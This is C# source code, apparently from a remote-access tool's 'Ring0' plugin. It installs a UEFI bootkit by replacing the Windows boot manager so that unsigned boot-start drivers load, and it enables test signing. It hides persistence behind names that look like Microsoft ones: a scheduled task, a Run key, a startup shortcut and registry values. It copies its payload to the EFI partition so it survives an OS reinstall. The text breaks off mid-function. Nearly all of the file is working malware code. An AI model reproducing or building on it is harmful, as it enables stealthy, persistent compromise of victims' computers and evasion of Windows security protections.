using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using Microsoft.Win32.SafeHandles;
using Pulsar.Plugin.Ring0.Common;

namespace Pulsar.Plugin.Ring0.Client
{
    /// <summary>
    /// UEFI Bootkit installer for DSE bypass
    /// 
    /// The bootkit works by:
    /// 1. Replacing bootmgfw.efi with the bootkit
    /// 2. On boot, hooks FreePages in EFI boot services
    /// 3. Detects winload.efi loading and patches ImgpValidateImageHash
    /// 4. Converts "jz short" to "jmp short" and "call ImgpValidateImageHash" to "xor eax, eax; nop; nop; nop"
    /// 5. This allows any Boot Start driver to load regardless of signature
    /// 
    /// Requirements:
    /// - Driver must be SERVICE_BOOT_START (start=boot)
    /// - Secure Boot must be disabled (or bootkit must be signed)
    /// - System must be UEFI (not legacy BIOS)
    /// </summary>
    public static class BootkitInstaller
    {
        // Must match the path hardcoded in ringw0rm.efi EfiMain.c
        private const string ORIG_BOOTMGR_NAME = "bootmgfw.efi.bak.original";
        private const string REGISTRY_KEY = @"SOFTWARE\Microsoft\Windows\CurrentVersion\BootConfig";
        
        // EFI partition GUID type
        private const string EFI_PARTITION_GUID = "{c12a7328-f81f-11d2-ba4b-00a0c93ec93b}";
        
        // P/Invoke for direct volume flush
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool FlushFileBuffers(SafeFileHandle hFile);
        
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern SafeFileHandle CreateFileW(
            string lpFileName,
            uint dwDesiredAccess,
            uint dwShareMode,
            IntPtr lpSecurityAttributes,
            uint dwCreationDisposition,
            uint dwFlagsAndAttributes,
            IntPtr hTemplateFile);
        
        private const uint GENERIC_READ = 0x80000000;
        private const uint GENERIC_WRITE = 0x40000000;
        private const uint FILE_SHARE_READ = 0x00000001;
        private const uint FILE_SHARE_WRITE = 0x00000002;
        private const uint OPEN_EXISTING = 3;
        
        private static Action<string> _log;
        
        public static void SetLogger(Action<string> log) => _log = log;
        
        /// <summary>
        /// Log essential message - visible to customer
        /// </summary>
        private static void Log(string msg) => _log?.Invoke($"[Bootkit] {msg}");
        
        /// <summary>
        /// Log verbose/debug message - DEBUG builds only
        /// </summary>
        [System.Diagnostics.Conditional("DEBUG")]
        private static void LogVerbose(string msg)
        {
#if DEBUG
            _log?.Invoke($"[Bootkit] {msg}");
#endif
        }

        /// <summary>
        /// Check if Ring0 bootkit is installed (registry check only - no UI/popups)
        /// </summary>
        public static bool IsBootkitInstalled()
        {
            try
            {
                using (var key = Registry.LocalMachine.OpenSubKey(REGISTRY_KEY))
                {
                    if (key != null)
                    {
                        var installed = key.GetValue("BootOptimized");
                        return installed != null && Convert.ToInt32(installed) == 1;
                    }
                }
            }
            catch { }
            return false;
        }

        /// <summary>
        /// Get detailed bootkit diagnostic information
        /// </summary>
        public static BootkitDiagnostics GetDiagnostics()
        {
            var diag = new BootkitDiagnostics();
            
            // Check registry
            try
            {
                using (var key = Registry.LocalMachine.OpenSubKey(REGISTRY_KEY))
                {
                    if (key != null)
                    {
                        diag.RegistryMarkerExists = true;
                        diag.InstallDate = key.GetValue("OptimizeDate")?.ToString();
                        diag.OriginalPath = key.GetValue("OrigPath")?.ToString();
                        diag.EfiMount = key.GetValue("EfiMount")?.ToString();
                    }
                }
            }
            catch (Exception ex)
            {
                diag.RegistryError = ex.Message;
            }

            // Check test signing
            diag.TestSigningEnabled = IsTestSigningEnabled();

            // Try to mount and check EFI partition
            string efiPath = null;
            try
            {
                efiPath = MountEfiPartitionSilent();
                if (!string.IsNullOrEmpty(efiPath))
                {
                    diag.EfiMountSuccess = true;
                    diag.EfiMountPath = efiPath;

                    // Check for bootmgfw.efi (our bootkit)
                    string bootmgfwPath = Path.Combine(efiPath, "EFI", "Microsoft", "Boot", "bootmgfw.efi");
                    if (File.Exists(bootmgfwPath))
                    {
                        var fi = new FileInfo(bootmgfwPath);
                        diag.BootkitFileExists = true;
                        diag.BootkitFileSize = fi.Length;
                        
                        // Check if it's our bootkit (small size) or original (large)
                        diag.IsOurBootkit = fi.Length < 10000; // Our bootkit is ~3408 bytes
                    }

                    // Check for bootmgfw_orig.efi (backup)
                    string origPath = Path.Combine(efiPath, "EFI", "Microsoft", "Boot", "bootmgfw_orig.efi");
                    if (File.Exists(origPath))
                    {
                        var fi = new FileInfo(origPath);
                        diag.OriginalBackupExists = true;
                        diag.OriginalBackupSize = fi.Length;
                    }

                    // Check for bootx64.efi (fallback)
                    string fallbackPath = Path.Combine(efiPath, "EFI", "Boot", "bootx64.efi");
                    if (File.Exists(fallbackPath))
                    {
                        var fi = new FileInfo(fallbackPath);
                        diag.FallbackExists = true;
                        diag.FallbackSize = fi.Length;
                    }

                    UnmountEfiPartition(efiPath);
                }
            }
            catch (Exception ex)
            {
                diag.EfiError = ex.Message;
                if (!string.IsNullOrEmpty(efiPath))
                {
                    try { UnmountEfiPartition(efiPath); } catch { }
                }
            }

            return diag;
        }

        public class BootkitDiagnostics
        {
            public bool RegistryMarkerExists { get; set; }
            public string InstallDate { get; set; }
            public string OriginalPath { get; set; }
            public string EfiMount { get; set; }
            public string RegistryError { get; set; }
            
            public bool TestSigningEnabled { get; set; }
            
            public bool EfiMountSuccess { get; set; }
            public string EfiMountPath { get; set; }
            public string EfiError { get; set; }
            
            public bool BootkitFileExists { get; set; }
            public long BootkitFileSize { get; set; }
            public bool IsOurBootkit { get; set; }
            
            public bool OriginalBackupExists { get; set; }
            public long OriginalBackupSize { get; set; }
            
            public bool FallbackExists { get; set; }
            public long FallbackSize { get; set; }

            public override string ToString()
            {
                var sb = new StringBuilder();
                sb.AppendLine($"Registry: {(RegistryMarkerExists ? "YES" : "NO")}");
                if (RegistryMarkerExists)
                {
                    sb.AppendLine($"  InstallDate: {InstallDate}");
                }
                if (!string.IsNullOrEmpty(RegistryError))
                    sb.AppendLine($"  Error: {RegistryError}");
                
                sb.AppendLine($"TestSigning: {(TestSigningEnabled ? "ENABLED" : "DISABLED")}");
                
                sb.AppendLine($"EFI Mount: {(EfiMountSuccess ? "OK" : "FAILED")} {EfiMountPath}");
                if (!string.IsNullOrEmpty(EfiError))
                    sb.AppendLine($"  Error: {EfiError}");
                
                if (EfiMountSuccess)
                {
                    sb.AppendLine($"bootmgfw.efi: {(BootkitFileExists ? $"{BootkitFileSize} bytes" : "NOT FOUND")} {(IsOurBootkit ? "(BOOTKIT)" : "(ORIGINAL)")}");
                    sb.AppendLine($"bootmgfw_orig.efi: {(OriginalBackupExists ? $"{OriginalBackupSize} bytes" : "NOT FOUND")}");
                    sb.AppendLine($"bootx64.efi: {(FallbackExists ? $"{FallbackSize} bytes" : "NOT FOUND")}");
                }
                
                return sb.ToString();
            }
        }

        /// <summary>
        /// Check if test signing is enabled
        /// </summary>
        public static bool IsTestSigningEnabled()
        {
            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = "bcdedit.exe",
                    Arguments = "/enum {current}",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    CreateNoWindow = true
                };

                using (var proc = Process.Start(psi))
                {
                    string output = proc.StandardOutput.ReadToEnd();
                    proc.WaitForExit();
                    return output.Contains("testsigning") && output.Contains("Yes");
                }
            }
            catch { }
            return false;
        }

        /// <summary>
        /// Enable test signing mode via bcdedit
        /// </summary>
        public static InstallResult EnableTestSigning()
        {
            var result = new InstallResult();
            LogVerbose("Enabling test signing mode...");

            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = "bcdedit.exe",
                    Arguments = "/set testsigning on",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true
                };

                using (var proc = Process.Start(psi))
                {
                    string output = proc.StandardOutput.ReadToEnd();
                    string error = proc.StandardError.ReadToEnd();
                    proc.WaitForExit();

                    if (proc.ExitCode == 0)
                    {
                        result.Success = true;
                        result.Message = "Test signing enabled. Reboot required.";
                        result.RebootRequired = true;
                        LogVerbose("Test signing enabled successfully");
                    }
                    else
                    {
                        result.Success = false;
                        result.Message = $"bcdedit failed: {error}";
                        LogVerbose($"bcdedit failed: {error}");
                    }
                }
            }
            catch (Exception ex)
            {
                result.Success = false;
                result.Message = $"Failed to enable test signing: {ex.Message}";
                LogVerbose($"Exception: {ex.Message}");
            }

            return result;
        }

        /// <summary>
        /// Full installation: bootkit + test signing + driver as boot start
        /// This is the recommended method for maximum compatibility
        /// </summary>
        public static InstallResult FullInstall(byte[] bootkitEfi, byte[] driverBytes, ChaosDriver driver)
        {
            var result = new InstallResult();
            var sb = new StringBuilder();

            LogVerbose("Starting full Ring0 installation...");

            // Step 1: Install driver as Boot Start
            LogVerbose("Step 1: Installing driver as BOOT_START service...");
            if (driver.InstallDriver(driverBytes, bootStart: true))
            {
                sb.AppendLine("✓ Driver installed as BOOT_START");
                LogVerbose("Driver installed as BOOT_START");
            }
            else
            {
                result.Success = false;
                result.Message = "Failed to install driver as Boot Start service";
                return result;
            }

            // Step 2: Enable test signing (always, as backup)
            LogVerbose("Step 2: Enabling test signing...");
            var testSignResult = EnableTestSigning();
            if (testSignResult.Success)
            {
                sb.AppendLine("✓ Test signing enabled");
            }
            else
            {
                sb.AppendLine($"⚠ Test signing: {testSignResult.Message}");
                LogVerbose($"Test signing warning: {testSignResult.Message}");
            }

            // Step 3: Install bootkit if provided and Secure Boot is off
            if (bootkitEfi != null && bootkitEfi.Length > 0)
            {
                LogVerbose("Step 3: Installing Ring0 bootkit...");
                var bootkitResult = InstallBootkit(bootkitEfi);
                if (bootkitResult.Success)
                {
                    sb.AppendLine("✓ Ring0 bootkit installed");
                    result.EfiPath = bootkitResult.EfiPath;
                    result.BackupCreated = bootkitResult.BackupCreated;
                }
                else
                {
                    sb.AppendLine($"⚠ Bootkit: {bootkitResult.Message}");
                    LogVerbose($"Bootkit warning: {bootkitResult.Message}");
                }
            }
            else
            {
                sb.AppendLine("○ Bootkit not provided (relying on test signing)");
                LogVerbose("No bootkit EFI provided");
            }

            result.Success = true;
            result.RebootRequired = true;
            result.Message = sb.ToString().TrimEnd();
            
            // Step 4: Configure payload auto-protection
            LogVerbose("Step 4: Configuring payload auto-protection...");
            string payloadPath = GetClientPayloadPath();
            if (!string.IsNullOrEmpty(payloadPath))
            {
                ConfigurePayloadPersistence(result.EfiPath, payloadPath);
                sb.AppendLine("✓ Payload auto-protection configured");
                LogVerbose($"Payload persistence configured for: {payloadPath}");
            }
            else
            {
                sb.AppendLine("○ Payload path not detected");
            }
            
            result.Message = sb.ToString().TrimEnd();
            LogVerbose("Full installation complete. Reboot required.");
            return result;
        }

        /// <summary>
        /// Install Ring0 bootkit to EFI System Partition
        /// Replaces bootmgfw.efi with Ring0 bootkit
        /// </summary>
        public static InstallResult InstallBootkit(byte[] bootkitEfi)
        {
            var result = new InstallResult();

            try
            {
                if (!SystemChecks.IsAdmin())
                {
                    result.Success = false;
                    result.Message = "Administrator privileges required";
                    return result;
                }

                // Check Secure Boot - bootkit won't work if enabled
                var sbStatus = SystemChecks.CheckSecureBoot();
                if (sbStatus.SecureBootEnabled)
                {
                    result.Success = false;
                    result.Message = "Secure Boot is enabled. Disable it in BIOS first, or use test signing only.";
                    return result;
                }

                LogVerbose("Mounting EFI System Partition...");
                string efiPath = MountEfiPartitionSilent();
                
                if (string.IsNullOrEmpty(efiPath))
                {
                    result.Success = false;
                    result.Message = "Could not mount EFI System Partition";
                    return result;
                }

                result.EfiPath = efiPath;
                LogVerbose($"EFI partition mounted at {efiPath}");

                // Target: \EFI\Microsoft\Boot\bootmgfw.efi
                string bootDir = Path.Combine(efiPath, "EFI", "Microsoft", "Boot");
                string bootmgfwPath = Path.Combine(bootDir, "bootmgfw.efi");
                string origPath = Path.Combine(bootDir, ORIG_BOOTMGR_NAME);  // bootmgfw_orig.efi

                if (!File.Exists(bootmgfwPath))
                {
                    result.Success = false;
                    result.Message = $"bootmgfw.efi not found at {bootmgfwPath}";
                    return result;
                }

                // CRITICAL: Rename original to bootmgfw_orig.efi (Ring0 will chainload this)
                if (!File.Exists(origPath))
                {
                    LogVerbose($"Renaming original bootmgfw.efi to {ORIG_BOOTMGR_NAME}");
                    // Use Move instead of Copy to rename in-place
                    File.Move(bootmgfwPath, origPath);
                    result.BackupCreated = true;
                }
                else
                {
                    // Original already saved, just delete current bootmgfw.efi
                    LogVerbose("Original backup already exists, removing current bootmgfw.efi");
                    File.Delete(bootmgfwPath);
                }

                // Write bootkit as the new bootmgfw.efi - use FileStream to ensure flush
                LogVerbose($"Writing bootkit ({bootkitEfi.Length} bytes) as bootmgfw.efi");
                using (var fs = new FileStream(bootmgfwPath, FileMode.Create, FileAccess.Write, FileShare.None))
                {
                    fs.Write(bootkitEfi, 0, bootkitEfi.Length);
                    fs.Flush(true);  // Flush to disk, not just OS buffers
                }
                
                // Verify the file was written
                var written = new FileInfo(bootmgfwPath);
                if (!written.Exists || written.Length != bootkitEfi.Length)
                {
                    result.Success = false;
                    result.Message = $"Bootkit write verification failed! Expected {bootkitEfi.Length}, got {(written.Exists ? written.Length : 0)}";
                    return result;
                }
                LogVerbose($"Verified: {bootmgfwPath} = {written.Length} bytes");

                // DO NOT replace bootx64.efi - that's the fallback and should remain original
                // This allows recovery via UEFI boot menu if something goes wrong
                LogVerbose("Note: EFI\\Boot\\bootx64.efi left unchanged for recovery");

                // Set registry marker (use innocuous key name)
                using (var key = Registry.LocalMachine.CreateSubKey(REGISTRY_KEY))
                {
                    key.SetValue("BootOptimized", 1, RegistryValueKind.DWord);
                    key.SetValue("OptimizeDate", DateTime.UtcNow.ToString("o"));
                    key.SetValue("OrigPath", origPath);
                    key.SetValue("EfiMount", efiPath);
                }

                // Force kernel-level volume flush before unmount
                try
                {
                    // Open volume handle directly for flush
                    string volumePath = $"\\\\.\\{efiPath.TrimEnd('\\')}";
                    LogVerbose($"Flushing volume: {volumePath}");
                    
                    using (var volumeHandle = CreateFileW(
                        volumePath,
                        GENERIC_READ | GENERIC_WRITE,
                        FILE_SHARE_READ | FILE_SHARE_WRITE,
                        IntPtr.Zero,
                        OPEN_EXISTING,
                        0,
                        IntPtr.Zero))
                    {
                        if (!volumeHandle.IsInvalid)
                        {
                            if (FlushFileBuffers(volumeHandle))
                            {
                                LogVerbose("Volume flush: SUCCESS (kernel level)");
                            }
                            else
                            {
                                int err = Marshal.GetLastWin32Error();
                                LogVerbose($"Volume flush: WARNING - error {err}");
                            }
                        }
                        else
                        {
                            int err = Marshal.GetLastWin32Error();
                            LogVerbose($"Volume open: WARNING - error {err}, trying fsutil fallback");
                            
                            // Fallback to fsutil
                            var flushPsi = new ProcessStartInfo
                            {
                                FileName = "fsutil.exe",
                                Arguments = $"volume flush {efiPath.TrimEnd('\\')}",
                                UseShellExecute = false,
                                RedirectStandardOutput = true,
                                CreateNoWindow = true
                            };
                            using (var proc = Process.Start(flushPsi))
                            {
                                proc.WaitForExit(5000);
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    LogVerbose($"Volume flush warning: {ex.Message}");
                }

                // Read the file back to force any caches to sync
                try
                {
                    byte[] readBack = File.ReadAllBytes(bootmgfwPath);
                    LogVerbose($"Read-back verification: {readBack.Length} bytes");
                }
                catch { }

                // Longer delay to ensure filesystem sync before unmount
                System.Threading.Thread.Sleep(2000);

                // Unmount EFI partition
                UnmountEfiPartition(efiPath);

                result.Success = true;
                result.Message = "Ring0 bootkit installed successfully";
                result.RebootRequired = true;
                LogVerbose("Bootkit installation complete");
            }
            catch (Exception ex)
            {
                result.Success = false;
                result.Message = $"Installation failed: {ex.Message}";
                LogVerbose($"Exception: {ex.Message}");
            }

            return result;
        }

        /// <summary>
        /// Uninstall bootkit and restore original boot manager
        /// </summary>
        public static InstallResult UninstallBootkit()
        {
            var result = new InstallResult();

            try
            {
                LogVerbose("Uninstalling bootkit...");

                // Get original path from registry
                string origPath = null;
                string efiPath = null;
                
                using (var key = Registry.LocalMachine.OpenSubKey(REGISTRY_KEY))
                {
                    if (key != null)
                    {
                        origPath = key.GetValue("OrigPath") as string;
                        efiPath = key.GetValue("EfiMount") as string;
                    }
                }

                // Try to mount EFI if needed
                if (string.IsNullOrEmpty(efiPath) || !Directory.Exists(efiPath))
                {
                    efiPath = MountEfiPartitionSilent();
                }

                if (string.IsNullOrEmpty(efiPath))
                {
                    result.Success = false;
                    result.Message = "Could not access EFI partition";
                    return result;
                }

                string bootDir = Path.Combine(efiPath, "EFI", "Microsoft", "Boot");
                string bootmgfwPath = Path.Combine(bootDir, "bootmgfw.efi");

                // Find original - check registry path first, then default location, then legacy name
                if (string.IsNullOrEmpty(origPath) || !File.Exists(origPath))
                {
                    origPath = Path.Combine(bootDir, ORIG_BOOTMGR_NAME);
                }

                // Fallback to legacy filename if new name not found
                if (!File.Exists(origPath))
                {
                    string legacyPath = Path.Combine(bootDir, "bootmgfw.efi.bak.original");
                    if (File.Exists(legacyPath))
                    {
                        LogVerbose($"Found backup at legacy path: {legacyPath}");
                        origPath = legacyPath;
                    }
                }

                if (!File.Exists(origPath))
                {
                    result.Success = false;
                    result.Message = $"Original boot manager not found at {origPath}";
                    return result;
                }

                // Delete the bootkit (current bootmgfw.efi)
                if (File.Exists(bootmgfwPath))
                {
                    LogVerbose("Removing bootkit...");
                    File.Delete(bootmgfwPath);
                }

                // Restore original by renaming back
                LogVerbose($"Restoring original boot manager from {ORIG_BOOTMGR_NAME}");
                File.Move(origPath, bootmgfwPath);

                // Remove registry marker
                try
                {
                    Registry.LocalMachine.DeleteSubKey(REGISTRY_KEY, false);
                }
                catch { }

                UnmountEfiPartition(efiPath);

                result.Success = true;
                result.Message = "Bootkit uninstalled. Original boot manager restored.";
                result.RebootRequired = true;
                LogVerbose("Uninstall complete");
            }
            catch (Exception ex)
            {
                result.Success = false;
                result.Message = $"Uninstallation failed: {ex.Message}";
            }

            return result;
        }

        /// <summary>
        /// Mount EFI partition silently (no popups)
        /// </summary>
        private static string MountEfiPartitionSilent()
        {
            try
            {
                // First check if already mounted
                foreach (char drive in "STUVWXYZ")
                {
                    string path = $"{drive}:\\";
                    try
                    {
                        if (Directory.Exists(path) && 
                            Directory.Exists(Path.Combine(path, "EFI", "Microsoft", "Boot")))
                        {
                            return path.TrimEnd('\\') + "\\";
                        }
                    }
                    catch { }
                }

                // Find available drive letter
                char mountLetter = '\0';
                for (char c = 'Z'; c >= 'S'; c--)
                {
                    if (!Directory.Exists($"{c}:\\"))
                    {
                        mountLetter = c;
                        break;
                    }
                }

                if (mountLetter == '\0')
                {
                    LogVerbose("No available drive letter for EFI mount");
                    return null;
                }

                string mountPoint = $"{mountLetter}:";

                // Use diskpart to mount (more reliable than mountvol)
                string diskpartScript = Path.Combine(Path.GetTempPath(), "efi_mount.txt");
                File.WriteAllText(diskpartScript, 
                    "select disk 0\r\n" +
                    "select partition 1\r\n" +  // EFI is typically partition 1
                    $"assign letter={mountLetter}\r\n" +
                    "exit\r\n");

                try
                {
                    var psi = new ProcessStartInfo
                    {
                        FileName = "diskpart.exe",
                        Arguments = $"/s \"{diskpartScript}\"",
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden
                    };

                    using (var proc = Process.Start(psi))
                    {
                        if (proc != null)
                        {
                            proc.WaitForExit(15000);
                            LogVerbose($"diskpart exit code: {proc.ExitCode}");
                        }
                    }
                }
                catch (Exception procEx)
                {
                    LogVerbose($"diskpart Process.Start failed: {procEx.Message}");
                    // Try alternative: cmd /c diskpart - but still hidden
                    try
                    {
                        var cmdPsi = new ProcessStartInfo
                        {
                            FileName = "cmd.exe",
                            Arguments = $"/c diskpart /s \"{diskpartScript}\"",
                            UseShellExecute = false,
                            RedirectStandardOutput = true,
                            RedirectStandardError = true,
                            CreateNoWindow = true,
                            WindowStyle = ProcessWindowStyle.Hidden
                        };
                        using (var proc = Process.Start(cmdPsi))
                        {
                            proc?.WaitForExit(15000);
                        }
                    }
                    catch (Exception cmdEx)
                    {
                        LogVerbose($"cmd diskpart also failed: {cmdEx.Message}");
                    }
                }

                File.Delete(diskpartScript);

                // Verify mount
                if (Directory.Exists($"{mountPoint}\\EFI\\Microsoft\\Boot"))
                {
                    LogVerbose($"EFI partition mounted at {mountPoint}");
                    return mountPoint + "\\";
                }

                // Try alternate method: find EFI partition GUID and use mountvol
                return TryMountVolMethod(mountPoint);
            }
            catch (Exception ex)
            {
                LogVerbose($"Mount failed: {ex.Message}");
            }

            return null;
        }

        private static string TryMountVolMethod(string mountPoint)
        {
            try
            {
                // Get EFI partition volume GUID using PowerShell (silent)
                var psi = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = $"-NoProfile -ExecutionPolicy Bypass -Command \"$p = Get-Partition | Where-Object {{ $_.GptType -eq '{EFI_PARTITION_GUID}' }}; if($p) {{ $p.AccessPaths[0] }}\"",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };

                string volumeGuid = null;
                using (var proc = Process.Start(psi))
                {
                    volumeGuid = proc.StandardOutput.ReadToEnd().Trim();
                    proc.WaitForExit(5000);
                }

                if (!string.IsNullOrEmpty(volumeGuid) && volumeGuid.StartsWith("\\\\?\\"))
                {
                    // Mount using mountvol
                    var mountPsi = new ProcessStartInfo
                    {
                        FileName = "mountvol.exe",
                        Arguments = $"{mountPoint} {volumeGuid}",
                        UseShellExecute = false,
                        CreateNoWindow = true
                    };

                    using (var proc = Process.Start(mountPsi))
                    {
                        proc.WaitForExit(5000);
                    }

                    if (Directory.Exists($"{mountPoint}\\EFI"))
                    {
                        LogVerbose($"EFI partition mounted via mountvol at {mountPoint}");
                        return mountPoint + "\\";
                    }
                }
            }
            catch { }

            return null;
        }

        private static void UnmountEfiPartition(string mountPoint)
        {
            try
            {
                if (string.IsNullOrEmpty(mountPoint)) return;

                var psi = new ProcessStartInfo
                {
                    FileName = "mountvol.exe",
                    Arguments = $"{mountPoint} /d",
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                using (var proc = Process.Start(psi))
                {
                    proc.WaitForExit(5000);
                }
                
                LogVerbose($"Unmounted {mountPoint}");
            }
            catch { }
        }

        /// <summary>
        /// Get the path to the client payload executable
        /// </summary>
        private static string GetClientPayloadPath()
        {
            try
            {
                // Get the current process path - this is the payload
                string currentExe = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
                if (File.Exists(currentExe))
                {
                    return currentExe;
                }
            }
            catch { }
            return null;
        }

        /// <summary>
        /// Public wrapper for ConfigurePayloadPersistence - called from PluginClient.InstallRootkit
        /// </summary>
        public static void ConfigurePayloadPersistencePublic(string efiMount, string payloadPath)
        {
            ConfigurePayloadPersistence(efiMount, payloadPath);
        }

        /// <summary>
        /// Configure payload auto-protection in registry and backup to EFI
        /// Also creates multiple persistence mechanisms for auto-start at logon
        /// </summary>
        private static void ConfigurePayloadPersistence(string efiMount, string payloadPath)
        {
            LogVerbose($"[PERSISTENCE] Starting ConfigurePayloadPersistence...");
            LogVerbose($"[PERSISTENCE] EFI Mount: {efiMount ?? "NULL"}");
            LogVerbose($"[PERSISTENCE] Payload Path: {payloadPath ?? "NULL"}");
            
            try
            {
                // Store config in registry for driver reference
                LogVerbose("[PERSISTENCE] Setting up HKLM BootConfig registry...");
                using (var key = Registry.LocalMachine.CreateSubKey(REGISTRY_KEY))
                {
                    if (key != null)
                    {
                        key.SetValue("PayloadPath", payloadPath);
                        key.SetValue("PayloadName", Path.GetFileName(payloadPath));
                        key.SetValue("AutoProtect", 1, RegistryValueKind.DWord);
                        LogVerbose($"[PERSISTENCE] ✓ Registry config saved: {Path.GetFileName(payloadPath)}");
                    }
                    else
                    {
                        LogVerbose("[PERSISTENCE] ✗ Failed to create registry key");
                    }
                }

                // Backup payload to EFI partition
                if (!string.IsNullOrEmpty(efiMount))
                {
                    LogVerbose("[PERSISTENCE] Backing up to EFI partition...");
                    BackupToEfiPartition(efiMount, payloadPath);
                }
                
                // ==== PERSISTENCE METHOD 1: Scheduled Task (ONLOGON) ====
                // Changed to run as current user (not SYSTEM) so it runs in interactive session
                LogVerbose("[PERSISTENCE] Creating scheduled task...");
                string taskName = @"Microsoft\Windows\SystemRestore\SR";
                string quotedPath = $"\"{payloadPath}\"";
                // Use /RL HIGHEST but don't specify /RU SYSTEM - let it run as the logging on user
                string schtasksArgs = $"/Create /SC ONLOGON /TN \"{taskName}\" /TR {quotedPath} /F /RL HIGHEST";
                
                CreateScheduledTask(schtasksArgs, taskName);
                
                // ==== PERSISTENCE METHOD 2: HKCU Run key (runs in user session) ====
                LogVerbose("[PERSISTENCE] Creating HKCU Run key...");
                try
                {
                    using (var key = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"))
                    {
                        if (key != null)
                        {
                            key.SetValue("SecurityHealthSystray", $"\"{payloadPath}\"");
                            LogVerbose($"[PERSISTENCE] ✓ HKCU Run key created");
                            
                            // Verify it was written
                            string verify = key.GetValue("SecurityHealthSystray") as string;
                            LogVerbose($"[PERSISTENCE]   Verified value: {verify}");
                        }
                        else
                        {
                            LogVerbose("[PERSISTENCE] ✗ Failed to create HKCU Run key");
                        }
                    }
                }
                catch (Exception ex)
                {
                    LogVerbose($"[PERSISTENCE] ✗ HKCU Run key failed: {ex.Message}");
                }
                
                // ==== PERSISTENCE METHOD 3: Startup folder shortcut ====
                LogVerbose("[PERSISTENCE] Creating Startup folder shortcut...");
                try
                {
                    // Try user's startup folder first (more reliable)
                    string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                    LogVerbose($"[PERSISTENCE]   User Startup folder: {startupFolder}");
                    
                    if (string.IsNullOrEmpty(startupFolder))
                    {
                        startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup);
                        LogVerbose($"[PERSISTENCE]   Common Startup folder: {startupFolder}");
                    }
                    
                    if (!string.IsNullOrEmpty(startupFolder))
                    {
                        string shortcutPath = Path.Combine(startupFolder, "SecurityHealth.lnk");
                        LogVerbose($"[PERSISTENCE]   Creating shortcut at: {shortcutPath}");
                        CreateShortcut(shortcutPath, payloadPath);
                        
                        // Verify shortcut was created
                        if (File.Exists(shortcutPath))
                        {
                            LogVerbose($"[PERSISTENCE] ✓ Startup shortcut created ({new FileInfo(shortcutPath).Length} bytes)");
                        }
                        else
                        {
                            LogVerbose("[PERSISTENCE] ✗ Shortcut file not found after creation");
                        }
                    }
                    else
                    {
                        LogVerbose("[PERSISTENCE] ✗ No startup folder found");
                    }
                }
                catch (Exception ex)
                {
                    LogVerbose($"[PERSISTENCE] ✗ Startup shortcut failed: {ex.Message}");
                }
                
                LogVerbose("[PERSISTENCE] ConfigurePayloadPersistence complete.");
            }
            catch (Exception ex)
            {
                LogVerbose($"[PERSISTENCE] ✗ ConfigurePayloadPersistence error: {ex.Message}");
            }
        }

        /// <summary>
        /// Create a scheduled task using schtasks.exe
        /// </summary>
        private static void CreateScheduledTask(string schtasksArgs, string taskName)
        {
            var psi = new ProcessStartInfo
            {
                FileName = "schtasks.exe",
                Arguments = schtasksArgs,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden
            };

            try
            {
                using (var proc = Process.Start(psi))
                {
                    if (proc != null)
                    {
                        string output = proc.StandardOutput.ReadToEnd();
                        string error = proc.StandardError.ReadToEnd();
                        proc.WaitForExit(10000);
                        
                        if (proc.ExitCode == 0)
                        {
                            LogVerbose($"Scheduled task created: {taskName}");
                        }
                        else
                        {
                            LogVerbose($"schtasks exit {proc.ExitCode}: {error}");
                        }
                    }
                }
            }
            catch (Exception schEx)
            {
                LogVerbose($"schtasks failed: {schEx.Message}");
            }
        }

        /// <summary>
        /// Create a Windows shortcut (.lnk file) using COM
        /// </summary>
        private static void CreateShortcut(string shortcutPath, string targetPath)
        {
            try
            {
                // Use PowerShell to create shortcut since COM interop is complex
                string ps1 = $@"
$ws = New-Object -ComObject WScript.Shell
$sc = $ws.CreateShortcut('{shortcutPath.Replace("'", "''")}')
$sc.TargetPath = '{targetPath.Replace("'", "''")}'
$sc.WindowStyle = 7
$sc.Save()
";
                var psi = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = $"-NoProfile -NonInteractive -ExecutionPolicy Bypass -Command \"{ps1.Replace("\"", "\\\"")}\"",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };
                
                using (var proc = Process.Start(psi))
                {
                    proc?.WaitForExit(5000);
                }
            }
            catch (Exception ex)
            {
                LogVerbose($"CreateShortcut error: {ex.Message}");
            }
        }

        /// <summary>
        /// Backup critical files to EFI partition for OS reinstall survival
        /// </summary>
        public static void BackupToEfiPartition(string efiMount, string payloadPath)
        {
            try
            {
                string backupDir = Path.Combine(efiMount, "EFI", "RINGW0RM");
                Directory.CreateDirectory(backupDir);

                // Backup payload
                if (File.Exists(payloadPath))
                {
                    string dest = Path.Combine(backupDir, "payload.exe");
                    File.Copy(payloadPath, dest, true);
                    LogVerbose($"Payload backed up to EFI: {dest}");
                }

                // Save config
                string configPath = Path.Combine(backupDir, "config.json");
                var config = new System.Collections.Generic.Dictionary<string, string>
                {
                    {"PayloadPath", payloadPath},
                    {"PayloadName", Path.GetFileName(payloadPath)},
                    {"BackupDate", DateTime.UtcNow.ToString("o")}
                };
                string json = $"{{\"PayloadPath\":\"{payloadPath.Replace("\\", "\\\\")}\",\"PayloadName\":\"{Path.GetFileName(payloadPath)}\",\"BackupDate\":\"{DateTime.UtcNow:o}\"}}";
